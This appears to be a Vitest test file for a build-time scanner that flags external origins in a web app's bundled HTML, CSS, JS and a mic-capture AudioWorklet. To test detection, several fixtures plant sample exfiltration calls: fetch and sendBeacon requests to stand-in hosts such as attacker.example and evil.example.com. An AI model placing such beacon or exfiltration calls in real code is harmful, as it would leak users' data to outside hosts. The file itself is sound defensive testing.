import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  DIST_DIR,
  checkCssText,
  checkDist,
  checkHtmlText,
  checkJsText,
} from "../scripts/check-no-external-origin.mjs";

describe("check-no-external-origin.mjs — detection logic", () => {
  it("passes clean, self-hosted-only index.html", () => {
    const html = `<!doctype html><html><head>
      <link rel="icon" href="/favicon.svg">
      <script type="module" src="/assets/index-abc123.js"></script>
    </head><body><div id="root"></div></body></html>`;
    expect(checkHtmlText(html)).toEqual([]);
  });

  it("flags an external <script src>", () => {
    const html = `<script src="https://cdn.example.com/lib.js"></script>`;
    const findings = checkHtmlText(html, "index.html");
    expect(findings).toHaveLength(1);
    expect(findings[0]).toContain("https://cdn.example.com/lib.js");
  });

  it("flags a protocol-relative external <link href>", () => {
    const html = `<link rel="stylesheet" href="//fonts.googleapis.com/css">`;
    expect(checkHtmlText(html)).toHaveLength(1);
  });

  it("passes clean CSS with only local url()s", () => {
    const css = `@font-face { src: url(/assets/font-abc123.woff2) format("woff2"); }`;
    expect(checkCssText(css)).toEqual([]);
  });

  it("flags an external @font-face url()", () => {
    const css = `@font-face { src: url(https://fonts.gstatic.com/font.woff2); }`;
    const findings = checkCssText(css, "styles.css");
    expect(findings).toHaveLength(1);
    expect(findings[0]).toContain("fonts.gstatic.com");
  });

  it("flags an external @import", () => {
    const css = `@import url("https://fonts.googleapis.com/css2?family=Inter");`;
    const findings = checkCssText(css);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings.some((f) => f.includes("fonts.googleapis.com"))).toBe(true);
  });

  it("does not false-positive on a relative url() with no scheme", () => {
    const css = `.icon { background: url(icons.svg#gear); }`;
    expect(checkCssText(css)).toEqual([]);
  });

  // Round 4 item #2 [MINOR, reviewer finding]: checkDist used to scan only
  // index.html and *.css, so a real external call bundled into JS passed
  // silently. checkJsText closes that gap.
  it("flags a planted external origin in a JS bundle -- the exact gap the reviewer found", () => {
    const js = 'fetch("https://example.com/exfiltrate").then(r=>r.json())';
    const findings = checkJsText(js, "index-abc123.js");
    expect(findings).toHaveLength(1);
    expect(findings[0]).toContain("https://example.com/exfiltrate");
    expect(findings[0]).toContain("index-abc123.js");
  });

  it("flags a planted http:// (not just https://) external origin", () => {
    const js = 'const u="http://attacker.example/beacon?x=1";sendBeacon(u)';
    const findings = checkJsText(js);
    expect(findings).toHaveLength(1);
    expect(findings[0]).toContain("http://attacker.example/beacon?x=1");
  });

  it("allows the React error-decoder link (a known inert literal)", () => {
    const js = '"https://reactjs.org/docs/error-decoder.html?invariant="+e';
    expect(checkJsText(js)).toEqual([]);
  });

  it("allows every W3C XML/SVG/MathML/XHTML namespace URI (known inert literals)", () => {
    const js = [
      '"http://www.w3.org/2000/svg"',
      '"http://www.w3.org/1999/xlink"',
      '"http://www.w3.org/XML/1998/namespace"',
      '"http://www.w3.org/1999/xhtml"',
      '"http://www.w3.org/1998/Math/MathML"',
    ].join(";");
    expect(checkJsText(js)).toEqual([]);
  });

  it("does not let the allow-list swallow a real external origin merely hosted near w3.org text", () => {
    // an attacker-controlled string mentioning "w3.org" in its path/query
    // must not slip through just because the allow-list pattern is a
    // prefix match on the wrong anchor -- this one's HOST is attacker.example.
    const js = '"https://attacker.example/www.w3.org/2000/svg"';
    const findings = checkJsText(js);
    expect(findings).toHaveLength(1);
  });

  it("passes JS with no http(s) literal at all", () => {
    expect(checkJsText('console.log("hello")')).toEqual([]);
  });

  it("checkJsText also passes a clean script with only relative/no-literal URLs (the worklet's own shape)", () => {
    const js = `postMessage(chunk, [chunk.buffer]); const x = "not-a-url";`;
    expect(checkJsText(js)).toEqual([]);
  });
});

// Round 4 (t18): folded into the SAME `checkJsText` the main JS bundle (c)
// already uses (the reviewer's own instruction -- "fold your worklet
// presence/scan into that version rather than carrying two scanners").
// This describe block only proves the NEW surface -- presence and
// checkDist wiring -- not checkJsText's own detection rules, which the
// block above already covers exhaustively.
describe("the cited mic-capture AudioWorklet asset (task t18 round 3, finding 5)", () => {
  let scratchDir: string | null = null;
  afterEach(() => {
    if (scratchDir) rmSync(scratchDir, { recursive: true, force: true });
    scratchDir = null;
  });

  it("checkDist reports a finding when dist/worklets/pcm-capture-processor.js is missing (an otherwise-clean build)", () => {
    // A synthetic dist/ with a clean index.html/CSS but NO worklets/ dir at
    // all: checkDist must name the missing asset, not silently pass -- the
    // pre-fix behavior was a build without the worklet exiting 0 with no
    // signal anywhere, which is exactly the defect this test pins.
    scratchDir = mkdtempSync(join(tmpdir(), "no-external-origin-worklet-"));
    writeFileSync(
      join(scratchDir, "index.html"),
      `<!doctype html><script type="module" src="/assets/index.js"></script>`,
    );
    const findings = checkDist(scratchDir);
    expect(findings.some((f) => f.includes("pcm-capture-processor.js") && f.includes("missing"))).toBe(
      true,
    );
  });

  it("checkDist reports nothing extra once the worklet is present and clean", () => {
    scratchDir = mkdtempSync(join(tmpdir(), "no-external-origin-worklet-"));
    writeFileSync(join(scratchDir, "index.html"), `<!doctype html>`);
    const workletsDir = join(scratchDir, "worklets");
    mkdirSync(workletsDir);
    writeFileSync(join(workletsDir, "pcm-capture-processor.js"), `registerProcessor("x", class {});`);
    expect(checkDist(scratchDir)).toEqual([]);
  });

  it("checkDist flags an external-origin string literal inside a present worklet file", () => {
    scratchDir = mkdtempSync(join(tmpdir(), "no-external-origin-worklet-"));
    writeFileSync(join(scratchDir, "index.html"), `<!doctype html>`);
    const workletsDir = join(scratchDir, "worklets");
    mkdirSync(workletsDir);
    writeFileSync(
      join(workletsDir, "pcm-capture-processor.js"),
      `fetch("https://evil.example.com/exfiltrate");`,
    );
    const findings = checkDist(scratchDir);
    expect(findings.some((f) => f.includes("evil.example.com"))).toBe(true);
  });

  const distBuilt2 = existsSync(join(DIST_DIR, "worklets", "pcm-capture-processor.js"));
  it.skipIf(!distBuilt2)(
    "is present in the real built dist/ and references no external origin",
    () => {
      const findings = checkDist();
      const workletFindings = findings.filter((f) => f.includes("pcm-capture-processor.js"));
      expect(workletFindings).toEqual([]);
    },
  );
  if (!distBuilt2) {
    it("is skipped: run `npm run build` first to exercise the worklet check against the real bundle", () => {
      expect(distBuilt2).toBe(false);
    });
  }
});

describe("the actual built dist/ (acceptance criterion #3)", () => {
  const distBuilt = existsSync(join(DIST_DIR, "index.html"));

  it.skipIf(!distBuilt)(
    "references no external origin in index.html, any bundled CSS, or any bundled JS",
    () => {
      const findings = checkDist();
      expect(findings).toEqual([]);
    },
  );

  if (!distBuilt) {
    it("is skipped: run `npm run build` first to exercise this against the real bundle", () => {
      expect(distBuilt).toBe(false);
    });
  }
});
